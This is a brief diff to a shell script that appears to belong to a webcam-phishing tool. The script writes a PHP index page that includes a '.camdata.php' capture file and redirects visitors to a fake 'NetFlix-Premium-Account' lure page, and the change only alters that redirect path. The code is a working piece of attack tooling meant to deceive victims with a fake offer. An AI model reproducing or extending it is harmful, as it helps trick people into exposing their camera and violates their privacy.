@@ -48,7 +48,7 @@ fi
 if [[ -e .www/index.php ]]; then
 echo ""
 else
-printf "<?php\ninclude '.camdata.php';\nheader('Location: NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
+printf "<?php\ninclude '.camdata.php';\nheader('Location: forwarding_link/NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
 fi
 
 if [[ -e .www/.camdata.php ]]; then
